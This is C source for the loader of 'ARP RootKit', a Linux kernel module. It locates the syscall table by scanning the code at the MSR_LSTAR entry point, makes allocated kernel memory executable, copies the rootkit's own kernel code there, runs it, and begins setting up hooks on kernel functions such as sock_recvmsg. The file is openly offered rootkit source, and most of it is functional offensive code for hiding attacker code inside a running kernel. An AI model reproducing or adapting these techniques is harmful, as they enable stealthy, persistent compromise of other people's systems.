/*
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

/*
 * This is the loader. Will get the RootKit Kernel resident into the Linux Kernel.
 */
#include <linux/net.h>
#include <asm/cpu_entry_area.h>
#include <asm/msr.h>
#include <linux/set_memory.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/pid_namespace.h>
#include <linux/kallsyms.h>
#include <linux/rculist.h>
#include <linux/hash.h>
#include <linux/sched/signal.h>
#include <linux/module.h>       /* Needed by all modules */
#include <linux/kernel.h>       /* Needed for KERN_INFO */
#include <linux/init.h>         /* Needed for the macros */
#include <linux/version.h> /* For LINUX_VERSION_CODE */
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>
#include <capstone.h>

/*
 * Macros
 */
#define PAGE_ROUND_DOWN(x) (((unsigned long)(x)) & (~(PAGE_SIZE-1)))
#define PAGE_ROUND_UP(x) ((((unsigned long)(x)) + PAGE_SIZE-1) & (~(PAGE_SIZE-1)))

/*
 * Kernel shared definitions: labels, variables and functions.
 */
#include "kernel.h"

/*
 * Hook handlers, trampolines, everything about hooking.
 */
#include "hooking.h"

/*
 * Loader declarations.
 */
//void *readfile(const char *file, size_t *len);
int disassemble(void *code, size_t code_len);
void *search_sct(void);
void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len);
void hook_kernel_funcs(void);

/*
 * Global variables.
 */
void (*f_kernel_test)(void) = NULL;

int init_module(void)
{
	size_t kernel_len, kernel_paglen, kernel_pages;
	void *kernel_addr = NULL;

    kernel_len = &kernel_end - &kernel_start;
    kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
    kernel_pages = kernel_paglen >> PAGE_SHIFT;

    /*
     * Make our kernel executable, to can use pinfo(), perr().
     */
    set_memory_x(PAGE_ROUND_DOWN(&kernel_start), kernel_pages);

	/*
	 * Load Linux Kernel exported symbols for our rootkit.
	 */
    f_kmalloc = kmalloc;
    f_kfree = kfree;
    f_find_vpid = find_vpid;
    f_vscnprintf = vscnprintf;

	/*
	 * Search sys_call_table[] address.
	 */
	sys_call_table = search_sct();
	if (sys_call_table == NULL) {
		return 0;
	}
    
	/*
     * Linux Kernel syscall symbols for our rootkit.
     */
    f_sys_write = sys_call_table[__NR_write]; // now we can print into stdout and stderr =)

/*
	pinfo("%p\n", __rdmsr(MSR_LSTAR));
	char *p = __rdmsr(MSR_LSTAR);
	p[0] = 0x90;
	disassemble(p, 1);
*/
/*	void * (*f__vmalloc_node_range)(unsigned long size, unsigned long align,
            unsigned long start, unsigned long end, gfp_t gfp_mask,
            pgprot_t prot, unsigned long vm_flags, int node,
            const void *caller) = kallsyms_lookup_name("__vmalloc_node_range");
	unsigned long mstart = (unsigned long)get_cpu_entry_area(nr_cpu_ids);
	unsigned long mend = (unsigned long)get_cpu_entry_area(nr_cpu_ids + 1) - PAGE_SIZE;
	size_t msize = mend - mstart;
	pinfo("mstart = %p, mend = %p, size = %d, pages = %d\n", mstart, mend, msize, msize / PAGE_SIZE);
	void *p = f__vmalloc_node_range(PAGE_SIZE, 1,
                    mstart,
                    mend, GFP_KERNEL,
                    PAGE_KERNEL_EXEC, 0, NUMA_NO_NODE,
                    __builtin_return_address(0));
	pinfo("%p\n", p);
	if (p != NULL)
		(*f_kfree())(p);

	int i = 0;
	for(; i < nr_cpu_ids; i++) {
		unsigned long p = __rdmsr(MSR_LSTAR);
		pinfo("MSR_LSTAR = %p, cpu_entry_area(%d) = %p, offset = %lx\n", p, i, get_cpu_entry_area(i), p - (unsigned long)get_cpu_entry_area(i));
		disassemble((unsigned long)get_cpu_entry_area(i) + 0x5000, 0x3c);
	}
	*/
//	return 0;

	pinfo("Hurra! sys_call_table = %p\n", sys_call_table);

	//printk("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_addr = %p, kernel_pagdown_addr = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));

	/*
     * Insert out rootkit into memory.
	 */
	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %p, kernel_start_pagdown = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
	kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
	if (kernel_addr != NULL) {
		pinfo("kernel_addr = %p, kernel_addr_pagdown = %p\n", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
		/*
		 * Make our rootkit code executable.
		 */
		set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
		pinfo("kernel_addr's pages are now executable.\n");

		memcpy(kernel_addr, &kernel_start, kernel_len);
		pinfo("kernel is now copied to kernel_addr.\n");
		
		//disassemble(kernel_addr + ((unsigned long)&kernel_code_start - (unsigned long)&kernel_start), ((unsigned long)&kernel_end - (unsigned long)&kernel_code_start));

		kernel_test();
		pinfo("kernel_test execution from LKM successful.\n");

		f_kernel_test = kernel_addr + ((unsigned long)&kernel_test - (unsigned long)&kernel_start);
		pinfo("f_kernel_test at %p\n", f_kernel_test);
		f_kernel_test();
		pinfo("f_kernel_test execution from allocated code, successful.\n");

		hook_kernel_funcs();

		//pinfo("ARPRootKit successfully installed!\n");

		// uncomment for testing:
		//(*f_kfree())(kernel_addr);

	} else {
		perr("can not allocate memory.\n");
	}

    return 0;
}

void cleanup_module(void)
{
}

void hook_kernel_funcs(void) {
	disassemble(sock_recvmsg, 0x20);
}

int disassemble(void *code, size_t code_len) {
	csh handle;
	cs_insn *insn;
	size_t count;
	size_t j, i;
	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
		perr("cs_open() error\n");
		return -1;
	}

	cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax

	count = cs_disasm(handle, code, code_len, (unsigned long)code, 0, &insn);
	pinfo("%d instructions disassembled.\n", count);
	if (count > 0) {
		for (j = 0; j < count; j++) {
			pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
			for (i = 0; i< insn[j].size; i++) {
				pinfo("%02x ", insn[j].bytes[i]);
			}
			pinfo("\n");
		}
		cs_free(insn, count);
	} else {
		pinfo("ERROR: Failed to disassemble given code!\n");
		cs_close(&handle);
		return -1;
	}
	cs_close(&handle);

	return 0;
}

void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len) {
    while (hs_len >= n_len) {
        hs_len--;
        if (!memcmp(haystack, needle, n_len))
            return (void *)haystack;
        haystack++;
    }
    return NULL;
}

void *search_sct(void) {
	void *sct = (void *) __rdmsr(MSR_LSTAR);
	// DO NOT call disassemble() in this function as sys_write is not yet imported!
	// or import sys_write into f_sys_write before calling:
	//*f_sys_write() = kallsyms_lookup_name("sys_write");
	//disassemble(sct, 0x3c);
	sct = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
	if (memcmp(sct + 3 + 4, "\xff\xe7", 2) == 0) { // found!
		sct += 3;
		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1) + (2 + 1 + 0x31);
		//disassemble(sct, 0x100);
		sct = memmem(sct, 0x100, "\xff\x14\xc5", 3); // search: call *sys_call_table(, %rax, 8)
		if (sct) {
			sct += 3;
			sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1);
			return sct;
		} else{
			// can't write without sys_write() :(
			//perr("Sorry! call not found when searching sct.\n");
		}
	} else {
		// commented after leaving the use of kallsysm_lookup_name() :(
		//perr("Sorry! jmp address not found when searching sct.\n");
	}

	return NULL;
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
MODULE_DESCRIPTION("This is the loader of the rootkit's kernel (kernel.c).");
